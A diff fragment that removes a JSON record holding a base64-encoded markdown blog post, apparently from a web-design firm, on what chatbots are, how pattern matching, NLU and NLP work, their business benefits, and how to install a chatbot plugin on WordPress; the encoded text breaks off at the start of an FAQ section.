@@ -1,1 +1,215 @@
-{"data":"LS0tCnRpdGxlOiAiQ2hhdGJvdHMgQW5kIEl0cyBJbXBvcnRhbmNlIgpzbHVnOiAiY2hhdGJvdHMtYW5kLWl0cy1pbXBvcnRhbmNlIgpkYXRlOiAiMjAyMy0xMS0xNiIKYXV0aG9yOiAiQ2FuYWRpYW4gV2ViIERlc2lnbnMiCmRlc2NyaXB0aW9uOiAiQ2hhdGJvdHMgQW5kIEl0cyBJbXBvcnRhbmNlIgprZXl3b3JkczogWyJjaGF0Ym90cyBhbmQgaXRzIGltcG9ydGFuY2UiLCJCbG9nIl0KY2F0ZWdvcnk6ICJCbG9nIgpmZWF0dXJlZEltYWdlOiAiaHR0cHM6Ly9vbGQuY2FuYWRpYW53ZWJkZXNpZ25zLmNhL3dwLWNvbnRlbnQvdXBsb2Fkcy8yMDIwLzExL0NoYXRib3RzLUFuZC1JdHMtSW1wb3J0YW5jZS1zY2FsZWQuanBnIgotLS0KCjxoMiBjbGFzcz0id3AtYmxvY2staGVhZGluZyIgaWQ9Imgtd2hhdC1pcy1hLWNoYXRib3QiPldoYXQgaXMgYSBjaGF0Ym90PzwvaDI+Cgo8cD5JdCBpcyBhbiBhcnRpZmljaWFsIGludGVsbGlnZW5jZSAoQUkpIHNvZnR3YXJlIG9yIGEgY29tcHV0ZXIgcHJvZ3JhbSB0aGF0IGNvbmR1Y3RzIGEgY29udmVyc2F0aW9uIHRocm91Z2ggYXVkaW8gb3IgdGV4dHVhbCBtZXRob2RzLiBJbiB0aGUgbW9kZXJuIGVyYSwgdGhlIGFiaWxpdHkgdG8gY29tbXVuaWNhdGUgZWZmZWN0aXZlbHkgYW5kIGVmZmljaWVudGx5IGhvbGRzIGEgc2lnbmlmaWNhbnQgcGxhY2UuIFRlY2hub2xvZ2ljYWwgYWR2YW5jZW1lbnRzIGhhdmUgcHJvcGVsbGVkIHVzIGludG8gYW4gYWdlIHdoZXJlIHdlIGNhbiBjb25uZWN0IGluc3RhbnRseSB3aXRoIGFueW9uZSwgYW55d2hlcmUuIEF0IHRoZSBoZWFydCBvZiB0aGlzIGRpZ2l0YWwgdHJhbnNmb3JtYXRpb24sIHRoZSBjb25jZXB0IG9mIHRoZSBjaGF0Ym90IGhhcyBiZWNvbWUgaW5jcmVhc2luZ2x5IHByZXZhbGVudC4gVGhlc2UgaW50ZXJhY3RpdmUgcHJvZ3JhbXMsIHBvd2VyZWQgYnkgQXJ0aWZpY2lhbCBJbnRlbGxpZ2VuY2UgKEFJKSwgYXJlIHJlc2hhcGluZyB0aGUgd2F5cyB3ZSBjb21tdW5pY2F0ZSBvbmxpbmUsIG9wZW5pbmcgdXAgYSB3ZWFsdGggb2Ygb3Bwb3J0dW5pdGllcyBhbmQgY2hhbGxlbmdlcy48L3A+Cgo8aDIgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPldoeSBhcmUgY2hhdGJvdHMgaW1wb3J0YW50PzwvaDI+Cgo8cD5BIGNoYXRib3QgcmVwcmVzZW50cyB0aGUgbmF0dXJhbCBldm9sdXRpb24gb2YgYSBRdWVzdGlvbi1hbnN3ZXIgc3lzdGVtIGxldmVyYWdpbmcgTmF0dXJhbCBMYW5ndWFnZSBQcm9jZXNzaW5nIChOTFApLiBGb3JtdWxhdGluZyByZXNwb25zZXMgdG8gcXVlc3Rpb25zIGluIGEgbmF0aXZlIGxhbmd1YWdlIGlzwqBhcHBsaWVkIGluIHZhcmlvdXMgZW50ZXJwcmlzZSBlbmQtdXNlIGFwcGxpY2F0aW9ucy48L3A+Cgo8aDIgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciIGlkPSJoLWNoYXQtYm90LWEtdmlydHVhbC1jb21tdW5pY2F0aW9uLXBvd2VyaG91c2UiPkNoYXQgQm90OiBBIFZpcnR1YWwgQ29tbXVuaWNhdGlvbiBQb3dlcmhvdXNlPC9oMj4KCjxwPkEgY2hhdGJvdCwgYWxzbyBrbm93biBhcyBhbiBBSSBjaGF0Ym90LCBpcyBhIHByb2dyYW0gZGVzaWduZWQgdG8gc2ltdWxhdGUgaHVtYW4tbGlrZSBjb252ZXJzYXRpb25zLiBUaGV5IGNhbiByZXNwb25kIHRvIHRleHQgaW5wdXRzIHdpdGggYXBwcm9wcmlhdGUgcmVzcG9uc2VzIGFuZCBldmVuIHVuZGVyc3RhbmQgbmF0dXJhbCBsYW5ndWFnZSB1c2luZyB0ZWNobm9sb2dpZXMgbGlrZSBOYXR1cmFsIExhbmd1YWdlIFByb2Nlc3NpbmcgKE5MUCkuIEJvdCBjaGF0IG9ubGluZSBzZXJ2aWNlcyBoYXZlIGJlY29tZSBwb3B1bGFyIGR1ZSB0byB0aGVpciBwb3RlbnRpYWwgdG8gcHJvdmlkZSAyNC83IGN1c3RvbWVyIHNlcnZpY2UsIGdlbmVyYXRlIGxlYWRzLCBhbmQgZmFjaWxpdGF0ZSBzbW9vdGggY3VzdG9tZXIgZXhwZXJpZW5jZXMuPC9wPgoKPGgyIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIiBpZD0iaC1ob3ctZG9lcy1hLWNoYXRib3Qtd29yayI+SG93IGRvZXMgYSBDaGF0Ym90IHdvcms/PC9oMj4KCjxwPkNoYXRib3RzIHdvcmtzIG9uIHRocmVlIG1ldGhvZHM6PC9wPgoKPHVsPgo8bGk+PHN0cm9uZz5QYXR0ZXJuIE1hdGNoZXM8L3N0cm9uZz48L2xpPgoKPGxpPjxzdHJvbmc+TmF0dXJhbCBMYW5ndWFnZSBVbmRlcnN0YW5kaW5nIChOTFUpPC9zdHJvbmc+PC9saT4KCjxsaT48c3Ryb25nPk5hdHVyYWwgTGFuZ3VhZ2UgUHJvY2Vzc2luZyAoTkxQKTwvc3Ryb25nPjwvbGk+CjwvdWw+Cgo8aDIgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciIGlkPSJoLXBhdHRlcm4tbWF0Y2hlcyI+PHN0cm9uZz5QYXR0ZXJuIE1hdGNoZXM8L3N0cm9uZz48L2gyPgoKPHA+Q2hhdGJvdHMgdXRpbGl6ZXMgcGF0dGVybiBtYXRjaGVzIHRvIGNsYXNzaWZ5IHRoZSB0ZXh0IG9yIHNwZWVjaCwgYW5kIGl0IHByb2R1Y2VzIGEgc3VpdGFibGUgcmVzcG9uc2UgdG8gdGhlIHVzZXIuIEEgc3RhbmRhcmQgc3RydWN0dXJlIG1vZGVsIG9mIHRoZXNlIHBhdHRlcm5zIGlzIGNhbGxlZCBBcnRpZmljaWFsIEludGVsbGlnZW5jZSBNYXJrdXAgTGFuZ3VhZ2UgKEFJTUwpLiBJdCBpcyBhIHByb2dyYW1taW5nIGxhbmd1YWdlIHdoaWNoIGlzIEV4dGVuc2libGUgTWFya3VwIExhbmd1YWdlIChYTUwpIGRpYWxlY3QgdXNlZCBieSBjaGF0Ym90cy48L3A+Cgo8cD48c3Ryb25nPkEgc2ltcGxlIGV4YW1wbGUgb2YgUGF0dGVybiBNYXRjaGluZzo8L3N0cm9uZz48L3A+Cgo8cD5XSE8gSVMgQklMTCBHQVRFUz88L3A+Cgo8cD5CaWxsIEdhdGVzIGlzIGFuIEFtZXJpY2FuIGJ1c2luZXNzIGVudHJlcHJlbmV1ciwgYXV0aG9yLCBpbnZlc3RvciwgcGhpbGFudGhyb3Bpc3QsIGh1bWFuaXRhcmlhbiwgYW5kIGtub3duIGFzIHRoZSBwcmluY2lwYWwgZm91bmRlciBvZiBNaWNyb3NvZnQgQ29ycG9yYXRpb24uPC9wPgoKPGgyIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj5Sb2xlIGFuZCBBZHZhbnRhZ2VzIG9mIE9ubGluZSBDaGF0IEJvdHM8L2gyPgoKPHA+QW4gb25saW5lIGNoYXQgYm90LCBhdmFpbGFibGUgYXJvdW5kIHRoZSBjbG9jaywgY2FuIGluc3RhbnRseSByZXNwb25kIHRvIHVzZXIgcXVlcmllcy4gV2hldGhlciBpdCdzIGN1c3RvbWVyIHN1cHBvcnQsIGluZm9ybWF0aW9uIGRpc3NlbWluYXRpb24sIG9yIHVzZXIgZW5nYWdlbWVudCwgY2hhdCBib3RzIGFyZSByZXZvbHV0aW9uaXppbmcgdmFyaW91cyBpbmR1c3RyeSBzZWN0b3JzLiBUaGV5IG9mZmVyOjwvcD4KCjxwPjxzdHJvbmc+MS4gMjQvNyBBdmFpbGFiaWxpdHk6IDwvc3Ryb25nPkNoYXQgYm90cyBwcm92aWRlIGNvbnRpbnVvdXMgYXZhaWxhYmlsaXR5LCByZXNvbHZpbmcgcXVlcmllcyBvdXRzaWRlIHRyYWRpdGlvbmFsIHdvcmtpbmcgaG91cnMuPC9wPgoKPHA+PHN0cm9uZz4yLiBFZmZpY2llbmN5OiA8L3N0cm9uZz5UaGV5IGNhbiBoYW5kbGUgbXVsdGlwbGUgcmVxdWVzdHMgc2ltdWx0YW5lb3VzbHksIHJlZHVjaW5nIHdhaXRpbmcgdGltZXMuPC9wPgoKPHA+PHN0cm9uZz4zLiBDb25zaXN0ZW5jeTo8L3N0cm9uZz4gVGhleSBkZWxpdmVyIGNvbnNpc3RlbnQgcmVzcG9uc2VzIHRvIGNvbW1vbiBxdWVzdGlvbnMuPC9wPgoKPHA+PHN0cm9uZz40LiBDb3N0IFNhdmluZ3M6IDwvc3Ryb25nPkJ5IGF1dG9tYXRpbmcgdGFza3MsIHRoZXkgc2F2ZSBodW1hbiByZXNvdXJjZXMgYW5kIGNvc3RzLjwvcD4KCjxoMyBjbGFzcz0id3AtYmxvY2staGVhZGluZyIgaWQ9ImgtdGhlbi10aGUtbWFjaGluZS1naXZlcy1hbi1vdXRwdXQiPlRoZW4gdGhlIG1hY2hpbmUgZ2l2ZXMgYW4gb3V0cHV0PC9oMz4KCjxwPjxzdHJvbmc+SHVtYW46IDwvc3Ryb25nPkRvIHlvdSBrbm93IHdobyBCaWxsIEdhdGVzIGlzPzwvcD4KCjxwPjxzdHJvbmc+Q2hhdGJvdDogPC9zdHJvbmc+QmlsbCBHYXRlcyBpcyBhbiBBbWVyaWNhbiBidXNpbmVzcyBtYWduYXRlLCBpbnZlc3RvciwgYXV0aG9yLCBwaGlsYW50aHJvcGlzdCwgaHVtYW5pdGFyaWFuLCBhbmQga25vd24gYXMgdGhlIHByaW5jaXBhbCBmb3VuZGVyIG9mIE1pY3Jvc29mdCBDb3Jwb3JhdGlvbi48L3A+Cgo8cD5DaGF0Ym90cyBvbmx5IGtub3dzIHRoZSBhbnN3ZXIgYmVjYXVzZSB0aGUgZ2l2ZW4gbmFtZSBpcyBpbiB0aGUgYXNzb2NpYXRlZCBwYXR0ZXJuLiBCdXQgY2hhdGJvdHMgY2FuIG5vdCBnbyBiZXlvbmQgdGhlIHJlbGF0ZWQgcGF0dGVybi48L3A+Cgo8aDIgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciIGlkPSJoLW5hdHVyYWwtbGFuZ3VhZ2UtdW5kZXJzdGFuZGluZy1ubHUiPjxzdHJvbmc+TmF0dXJhbCBMYW5ndWFnZSBVbmRlcnN0YW5kaW5nIChOTFUpPC9zdHJvbmc+PC9oMj4KCjxwPjxhIGhyZWY9Imh0dHBzOi8vZW4ud2lraXBlZGlhLm9yZy93aWtpL05hdHVyYWwtbGFuZ3VhZ2VfdW5kZXJzdGFuZGluZyI+TmF0dXJhbCBMYW5ndWFnZSBVbmRlcnN0YW5kaW5nPC9hPiBpcyBhIHN1YnRvcGljIG9mIE5hdHVyYWwgTGFuZ3VhZ2UgUHJvY2Vzc2luZyBpbiBhcnRpZmljaWFsIGludGVsbGlnZW5jZSAoQUkpIHRoYXQgZGVhbHMgd2l0aCBtYWNoaW5lIHJlYWRpbmcgY29tcHJlaGVuc2lvbi4gSXQgdXNlcyB0aGUgcG93ZXIgb2YgbWFjaGluZSBsZWFybmluZyB0byBjb252ZXJ0IHNwZWVjaCB0byB0ZXh0IGFuZCBhbmFseXplIGl0cyBpbnRlbnQgZHVyaW5nIGFueSBpbnRlcmFjdGlvbi48L3A+Cgo8aDIgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciIGlkPSJoLW5hdHVyYWwtbGFuZ3VhZ2UtcHJvY2Vzc2luZy1ubHAiPjxzdHJvbmc+TmF0dXJhbCBMYW5ndWFnZSBQcm9jZXNzaW5nIChOTFApPC9zdHJvbmc+PC9oMj4KCjxwPjxhIGhyZWY9Imh0dHBzOi8vZW4ud2lraXBlZGlhLm9yZy93aWtpL05hdHVyYWxfbGFuZ3VhZ2VfcHJvY2Vzc2luZyI+TmF0dXJhbCBMYW5ndWFnZSBQcm9jZXNzaW5nPC9hPiBpcyBhIHN1YmZpZWxkIG9mIEFydGlmaWNpYWwgSW50ZWxsaWdlbmNlIChBSSkgY29uY2VybmVkIHdpdGggdGhlIGludGVyYWN0aW9uIG9mIGh1bWFucyBhbmQgY29tcHV0ZXJzLiBUaGUgcHJvY2VzcyB3aGVyZSBjaGF0Ym90cyB0YWtlIHNvbWUgY29tYmluYXRpb24gb2Ygc3RlcHMgdG8gY29udmVydCB0aGUgdXNlcidzIHRleHQgb3Igc3BlZWNoIGludG8gc3RydWN0dXJlZCBkYXRhIGFuZCB1c2VkIGl0IHRvIHNlbGVjdCB0aGUgYmVzdCBhbnN3ZXIgdG8gdGhlIHF1ZXJ5LjwvcD4KCjxoMiBjbGFzcz0id3AtYmxvY2staGVhZGluZyIgaWQ9Imgtd2h5LWFyZS1jaGF0Ym90cy1pbXBvcnRhbnQiPjxzdHJvbmc+V2h5IGFyZSBjaGF0Ym90cyBpbXBvcnRhbnQ/PC9zdHJvbmc+PC9oMj4KCjxoMyBjbGFzcz0id3AtYmxvY2staGVhZGluZyIgaWQ9ImgtMS1pbXByb3Zlcy1jdXN0b21lci1zZXJ2aWNlIj4xLiA8c3Ryb25nPkltcHJvdmVzIEN1c3RvbWVyIFNlcnZpY2U6PC9zdHJvbmc+PC9oMz4KCjx1bD4KPGxpPjxoMz48c3Ryb25nPkV4dGVuc2l2ZSBDdXN0b21lciBBc3Npc3RhbmNlPC9zdHJvbmc+PC9oMz4KPHVsPgo8bGk+ODMlIG9mIG9ubGluZSBjdXN0b21lcnMgbmVlZCBzdXBwb3J0IHdoZW4gdGhleSBzaG9wIG9ubGluZS4gVGhleSBtYXkgcmVxdWlyZSBoZWxwIGluIHVuZGVyc3RhbmRpbmcgd2hpY2ggcHJvZHVjdC9zZXJ2aWNlIGZvciB0aGVpciBuZWVkIG9yIGJ1ZGdldCBhbnkgdGltZSBvZiB0aGUgZGF5LiBDaGF0Ym90cyBjYW4gcHJvdmlkZSBjdXN0b21lciBhc3Npc3RhbmNlIGFueXRpbWUsIGxpa2UgYSByZWFsIHNhbGVzcGVyc29uIGluIGEgc3RvcmUuPC9saT4KPC91bD4KPC9saT4KCjxsaT48aDM+PHN0cm9uZz5BbHdheXMtQXZhaWxhYmxlIEN1c3RvbWVyIFN1cHBvcnQ8L3N0cm9uZz48L2gzPgo8dWw+CjxsaT5DaGF0Ym90cyBjYW4gaW1wcm92ZSBjdXN0b21lciBzdXBwb3J0LiBUaGV5IGFyZSBwcm9ncmFtbWVkIHRvIGdpdmUgYW4gYXV0b21hdGljIGFuc3dlciB0byBjdXN0b21lcnMgcmVwZXRpdGl2ZSBxdWVzdGlvbnMgYW5kIGZvcndhcmQgdGhlIHJlcXVlc3QgdG8gYSByZWFsIHBlcnNvbiBpZiB0aGUgcHJvYmxlbSBuZWVkcyBhIG1vcmUgY29tcGxpY2F0ZWQgcmVzcG9uc2UuPC9saT4KPC91bD4KPC9saT4KCjxsaT48aDM+PHN0cm9uZz5Qcm9hY3RpdmUgQ3VzdG9tZXIgSW50ZXJhY3Rpb248L3N0cm9uZz48L2gzPgo8dWw+CjxsaT5DaGF0Ym90cyBjYW4gcHJvYWN0aXZlbHkgc3RhcnQgYSBjb252ZXJzYXRpb24gd2l0aCB5b3VyIGN1c3RvbWVycyBiZXlvbmQgdGhlIHJvdXRpbmUgIldlbGNvbWUgVG8gT3VyIFdlYnNpdGUuIiBUaGVzZSBtYWtlIHlvdXIgY3VzdG9tZXJzIGZlZWwgeW91ciBicmFuZCBpcyBvbmUgc3RlcCBhaGVhZCBhbmQgaGVscCBpbXByb3ZlIHlvdXIgYnJhbmQgcGVyY2VwdGlvbiBpbiB0aGUgbG9uZyBydW4uPC9saT4KPC91bD4KPC9saT4KPC91bD4KCjxoMyBjbGFzcz0id3AtYmxvY2staGVhZGluZyIgaWQ9ImgtMi1pbmNyZWFzZS1jdXN0b21lci1lbmdhZ2VtZW50Ij4yLiA8c3Ryb25nPkluY3JlYXNlIEN1c3RvbWVyIEVuZ2FnZW1lbnQ8L3N0cm9uZz48L2gzPgoKPHVsPgo8bGk+Q2hhdGJvdHMgb2ZmZXIgYSByZWFsLXRpbWUsIG9uZS10by1vbmUgY29udmVyc2F0aW9uIHRoYXQgZW5nYWdlcyBjdXN0b21lcnMuIFRoZXkgY2FuIGluY3JlYXNlIHRoZSByZXNwb25zZSByYXRlIGJ5IGJlaW5nIGF2YWlsYWJsZSBhdCBhbnkgdGltZSBvZiB0aGUgZGF5LjwvbGk+CjwvdWw+Cgo8aDMgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciIGlkPSJoLTMtbW9uaXRvcmluZy1jb25zdW1lci1kYXRlLWFuZC1naXZlcy1pbnNpZ2h0cyI+My4gPHN0cm9uZz5Nb25pdG9yaW5nIENvbnN1bWVyIERhdGUgQW5kIEdpdmVzIEluc2lnaHRzLjwvc3Ryb25nPjwvaDM+Cgo8dWw+CjxsaT5XaXRoIGZlZWRiYWNrcywgY2hhdGJvdHMgY2FuIGNvbGxlY3QgZGF0YSB0aHJvdWdoIHNpbXBsZSBxdWVzdGlvbnMgdGhhdCBjYW4gZ2l2ZSB5b3UgaW5zaWdodHMgdGhhdCBjYW4gaGVscCBpbXByb3ZlIHlvdXIgcHJvZHVjdHMgb3Igc2VydmljZXMuIEl0IGNhbiBldmVuIGhlbHAgeW91IG9wdGltaXplIHlvdXIgd2Vic2l0ZSBieSB1c2luZyB0aGUgZGF0YSBjb2xsZWN0ZWQgZm9yIGltcHJvdmluZyB5b3VyIGxvdyBjb25jZXJ0aW5nIHBhZ2VzLjwvbGk+CjwvdWw+Cgo8ZGl2IHN0eWxlPSJoZWlnaHQ6MzVweCIgYXJpYS1oaWRkZW49InRydWUiIGNsYXNzPSJ3cC1ibG9jay1zcGFjZXIiPjwvZGl2PgoKPGgzIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIiBpZD0iaC00LWJldHRlci1sZWFkLWdlbmVyYXRpb24iPjQuIDxzdHJvbmc+QmV0dGVyIExlYWQgR2VuZXJhdGlvbjwvc3Ryb25nPjwvaDM+Cgo8dWw+CjxsaT5DaGF0Ym90cyBjYW4gYXNrIG5lY2Vzc2FyeSBhbmQgbW9zdCByZWxhdGVkIHF1ZXN0aW9ucywgcGVyc3VhZGUgb3RoZXIgdXNlcnMgYW5kIGdlbmVyYXRlIGxlYWRzIGZvciB5b3UuPC9saT4KPC91bD4KCjxwPkNoYXRib3RzIHdpdGggYXJ0aWZpY2lhbCBpbnRlbGxpZ2VuY2UgYXJlIGRyYW1hdGljYWxseSBjaGFuZ2luZyB0aGUgZGlnaXRhbCBidXNpbmVzcyB3b3JsZC4gSXQgY2FuIHJlYWNoIG91dCB0byBhIGJyb2FkIGF1ZGllbmNlIGJ5IHJlc3BvbmRpbmcgdG8gY3VzdG9tZXJzIGluIHJlYWwtdGltZSBhbmQgYmUgbW9yZSBlZmZlY3RpdmUgdGhhbiBodW1hbi4gT25lIG9mIHRoZSBtb3N0IHNpZ25pZmljYW50IGJlbmVmaXRzIG9mIGNoYXRib3RzIGluIHlvdXIgYnVzaW5lc3MgaXMgdGhleSBzYXZlIHRpbWUuIFRoZXkgY2FuIHByb3ZpZGUgZmFzdCBhbmQgYXV0b21hdGVkIGFuc3dlcnMgdG8geW91ciB2aXNpdG9yJ3MgcXVlc3Rpb25zIGFuZCBwcmV2ZW50IHRoZW0gZnJvbSB3YWl0aW5nIGEgZGF5IG9yIGxvbmdlciB0byByZWNlaXZlIGEgcmVzcG9uc2UgYXMgdGhleSB3b3VsZCBoYXZlIGluIHRoZSBwYXN0LjwvcD4KCjxoMiBjbGFzcz0id3AtYmxvY2staGVhZGluZyIgaWQ9ImgtaG93LXRvLXNldC11cC1jaGF0LWJvdC1vbi13b3JkcHJlc3MiPjxzdHJvbmc+SG93IHRvIFNldCB1cCBDaGF0IEJvdCBvbiBXb3JkUHJlc3M8L3N0cm9uZz48L2gyPgoKPGgzIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj4xLiA8c3Ryb25nPkNob29zZSBhIENoYXRib3QgUGx1Z2luIG9yIFNlcnZpY2U8L3N0cm9uZz48L2gzPgoKPHA+VGhlcmUgYXJlIG51bWVyb3VzIGNoYXRib3QgcGx1Z2lucyBhbmQgc2VydmljZXMgYXZhaWxhYmxlIGZvciBXb3JkUHJlc3MuIFNvbWUgcG9wdWxhciBvbmVzIGFyZTo8L3A+Cgo8dWw+CjxsaT5XUC1DaGF0Ym90IGZvciBNZXNzZW5nZXI8L2xpPgoKPGxpPlRpZGlvIExpdmUgQ2hhdDwvbGk+Cgo8bGk+RHJpZnQ8L2xpPgoKPGxpPkNoYXRCb3QgZm9yIFdvcmRQcmVzczwvbGk+CjwvdWw+Cgo8cD48c3Ryb25nPk5vdGU6PC9zdHJvbmc+IFlvdXIgY2hvaWNlIG1pZ2h0IGRlcGVuZCBvbiB0aGUgYm90J3MgcHVycG9zZSwgdGhlIGNvbXBsZXhpdHkgb2YgdGhlIGNvbnZlcnNhdGlvbnMgeW91IHdhbnQgdG8gbWFuYWdlLCBhbmQgb3RoZXIgaW50ZWdyYXRpb24gcmVxdWlyZW1lbnRzLjwvcD4KCjxoMyBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+Mi4gPHN0cm9uZz5JbnN0YWxsIHRoZSBQbHVnaW48L3N0cm9uZz48L2gzPgoKPG9sPgo8bGk+PHN0cm9uZz5WaWEgV29yZFByZXNzIERhc2hib2FyZDo8L3N0cm9uZz4gYS4gTG9nIGluIHRvIHlvdXIgV29yZFByZXNzIGRhc2hib2FyZC4gYi4gTmF2aWdhdGUgdG8gJ1BsdWdpbnMnICZndDsgJ0FkZCBOZXcnLiBjLiBTZWFyY2ggZm9yIHlvdXIgY2hvc2VuIGNoYXRib3QgcGx1Z2luLiBkLiBDbGljayAnSW5zdGFsbCBOb3cnIGFuZCB0aGVuICdBY3RpdmF0ZScuPC9saT4KCjxsaT48c3Ryb25nPlZpYSBNYW51YWwgVXBsb2FkOjwvc3Ryb25nPiBhLiBEb3dubG9hZCB0aGUgcGx1Z2luJ3MgemlwIGZpbGUgZnJvbSB0aGUgc291cmNlLiBiLiBHbyB0byAnUGx1Z2lucycgJmd0OyAnQWRkIE5ldycgJmd0OyAnVXBsb2FkIFBsdWdpbicgaW4geW91ciBXb3JkUHJlc3MgZGFzaGJvYXJkLiBjLiBVcGxvYWQgdGhlIGRvd25sb2FkZWQgemlwIGZpbGUuIGQuIENsaWNrICdJbnN0YWxsIE5vdycgYW5kIHRoZW4gJ0FjdGl2YXRlJy48L2xpPgo8L29sPgoKPGgzIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj4zLiA8c3Ryb25nPkNvbmZpZ3VyZSB0aGUgUGx1Z2luPC9zdHJvbmc+PC9oMz4KCjxvbD4KPGxpPkFmdGVyIGFjdGl2YXRpb24sIG1vc3QgY2hhdGJvdCBwbHVnaW5zIHdpbGwgYWRkIGEgbmV3IG1lbnUgaXRlbSB0byB0aGUgV29yZFByZXNzIGRhc2hib2FyZC48L2xpPgoKPGxpPkNsaWNrIG9uIHRoaXMgbmV3IG1lbnUgaXRlbSB0byBvcGVuIHRoZSBjaGF0Ym90IHNldHRpbmdzLjwvbGk+Cgo8bGk+RGVwZW5kaW5nIG9uIHRoZSBwbHVnaW4sIHlvdSBtaWdodCBuZWVkIHRvOmEuIDxzdHJvbmc+Q29ubmVjdCB3aXRoIGFuIGV4dGVybmFsIGFjY291bnQ8L3N0cm9uZz46IFNvbWUgY2hhdGJvdHMsIGVzcGVjaWFsbHkgdGhvc2UgdGllZCB0byBzZXJ2aWNlcyBsaWtlIEZhY2Vib29rIE1lc3Nlbmdlciwgd2lsbCByZXF1aXJlIHlvdSB0byBsaW5rIGFuIGFjY291bnQuYi4gPHN0cm9uZz5TZXQgdXAgYm90IHJlc3BvbnNlczwvc3Ryb25nPjogRGVmaW5lIGhvdyB0aGUgYm90IHNob3VsZCByZXBseSB0byBzcGVjaWZpYyB1c2VyIGlucHV0cyBvciBxdWVzdGlvbnMuIFNvbWUgYm90cyBvZmZlciBkcmFnLWFuZC1kcm9wIGludGVyZmFjZXMgZm9yIHRoaXMuYy4gPHN0cm9uZz5DdXN0b21pemUgYXBwZWFyYW5jZTwvc3Ryb25nPjogQWRqdXN0IHRoZSBsb29rIG9mIHRoZSBjaGF0IHdpZGdldCB0byBtYXRjaCB5b3VyIHNpdGUncyBkZXNpZ24uPC9saT4KPC9vbD4KCjxoMyBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+NC4gPHN0cm9uZz5UcmFpbiBZb3VyIENoYXRib3Q8L3N0cm9uZz48L2gzPgoKPHA+Rm9yIG1vcmUgc29waGlzdGljYXRlZCBjaGF0Ym90IHBsdWdpbnMgb3Igc2VydmljZXMgdGhhdCB1dGlsaXplIEFJLCB0aGVyZSB3aWxsIG9mdGVuIGJlIGEgcGVyaW9kIG9mICJ0cmFpbmluZyIuIFRoaXMgaXMgd2hlcmUgeW91IGlucHV0IHBvdGVudGlhbCBxdWVzdGlvbnMgYW5kIHByb3ZpZGUgdGhlIGJvdCB3aXRoIGFwcHJvcHJpYXRlIGFuc3dlcnMuIFRoZSBtb3JlIHlvdSB0cmFpbiB0aGUgYm90LCB0aGUgYmV0dGVyIGl0IGdldHMgYXQgdW5kZXJzdGFuZGluZyB1c2VyIHF1ZXJpZXMuPC9wPgoKPGgzIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj41LiA8c3Ryb25nPlRlc3QgdGhlIENoYXRib3Q8L3N0cm9uZz48L2gzPgoKPHA+QmVmb3JlIGdvaW5nIGxpdmU6PC9wPgoKPG9sPgo8bGk+VmlzaXQgeW91ciB3ZWJzaXRlIGFuZCBpbnRlcmFjdCB3aXRoIHRoZSBjaGF0Ym90LjwvbGk+Cgo8bGk+TWFrZSBzdXJlIGl0J3MgcmVzcG9uZGluZyBjb3JyZWN0bHkuPC9saT4KCjxsaT5BZGp1c3QgYW5kIHJlZmluZSBhbnkgbWVzc2FnZXMgb3Igc2V0dGluZ3MgYXMgbmVlZGVkLjwvbGk+Cjwvb2w+Cgo8aDMgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPjYuIDxzdHJvbmc+SW50ZWdyYXRlIHdpdGggT3RoZXIgVG9vbHMgKE9wdGlvbmFsKTwvc3Ryb25nPjwvaDM+Cgo8cD5EZXBlbmRpbmcgb24geW91ciBuZWVkcywgeW91IG1pZ2h0IHdhbnQgdGhlIGNoYXRib3QgdG8gaW50ZWdyYXRlIHdpdGggb3RoZXIgdG9vbHMgbGlrZSBlbWFpbCBtYXJrZXRpbmcgc29mdHdhcmUsIENSTSBzeXN0ZW1zLCBvciBhbmFseXRpY3MgdG9vbHMuIENoZWNrIHRoZSBjaGF0Ym90IHNldHRpbmdzIG9yIHRoZSBkb2N1bWVudGF0aW9uIGZvciBhdmFpbGFibGUgaW50ZWdyYXRpb25zLjwvcD4KCjxoMyBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+Ny4gPHN0cm9uZz5Nb25pdG9yIGFuZCBJbXByb3ZlPC9zdHJvbmc+PC9oMz4KCjxwPk9uY2UgeW91ciBjaGF0Ym90IGlzIGxpdmU6PC9wPgoKPG9sPgo8bGk+TW9uaXRvciBpdHMgaW50ZXJhY3Rpb25zIHdpdGggdXNlcnMuPC9saT4KCjxsaT5HYXRoZXIgZmVlZGJhY2sgZnJvbSB5b3VyIHdlYnNpdGUgdmlzaXRvcnMuPC9saT4KCjxsaT5SZWZpbmUgdGhlIGNoYXRib3QncyByZXNwb25zZXMgYW5kIGNhcGFiaWxpdGllcyBiYXNlZCBvbiB0aGUgZmVlZGJhY2sgYW5kIHBlcmZvcm1hbmNlIG1ldHJpY3MuPC9saT4KPC9vbD4KCjxoMyBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+VGlwczo8L2gzPgoKPHVsPgo8bGk+PHN0cm9uZz5CYWNrdXA8L3N0cm9uZz46IEFsd2F5cyBiYWNrIHVwIHlvdXIgV29yZFByZXNzIHdlYnNpdGUgYmVmb3JlIGluc3RhbGxpbmcgYW5kIGFjdGl2YXRpbmcgbmV3IHBsdWdpbnMuPC9saT4KCjxsaT48c3Ryb25nPkdEUFIgJmFtcDsgUHJpdmFjeTwvc3Ryb25nPjogSWYgeW914oCZcmUgZGVhbGluZyB3aXRoIHVzZXJzIGZyb20gdGhlIEVVIG9yIG90aGVyIHJlZ2lvbnMgd2l0aCBzdHJpY3QgZGF0YSBwcm90ZWN0aW9uIHJlZ3VsYXRpb25zLCBlbnN1cmUgeW91ciBjaGF0Ym90IGNvbXBsaWVzIHdpdGggdGhlc2UgcnVsZXMuIEluZm9ybSB1c2VycyBpZiB5b3XigJlyZSBjb2xsZWN0aW5nIGRhdGEgYW5kIGZvciB3aGF0IHB1cnBvc2UuPC9saT4KPC91bD4KCjxoMiBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+RkFRczwvaDI+Cgo8aDMgY2xhc3M9IndwLWJsb2NrLWhl